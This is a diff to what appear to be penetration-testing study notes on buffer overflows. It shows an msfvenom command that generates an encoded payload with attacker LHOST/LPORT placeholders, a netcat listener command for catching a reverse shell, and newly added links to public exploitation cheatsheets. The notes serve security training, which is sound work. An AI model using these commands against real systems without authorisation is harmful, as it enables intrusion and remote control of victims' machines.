@@ -30,3 +30,8 @@
 > 1. Generate payload: `msfvenom -p <payload> LHOST=<ip> LPORT=<port> EXITFUNC=thread -f <format> -e x86/shikata_ga_nai -b "<bad-chars> (e.g. \x00\x0a\x0d\x25\x26\x2b\x3d)"`
 > 2. Run listener: `sudo nc -nvlp <port>`
 > 3. Run exploit script
+
+## Cheatsheets
+
+> - [Tib3rius/Pentest-Cheatsheets](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)
+> - [V1n1v131r4/OSCP-Buffer-Overflow](https://github.com/V1n1v131r4/OSCP-Buffer-Overflow)
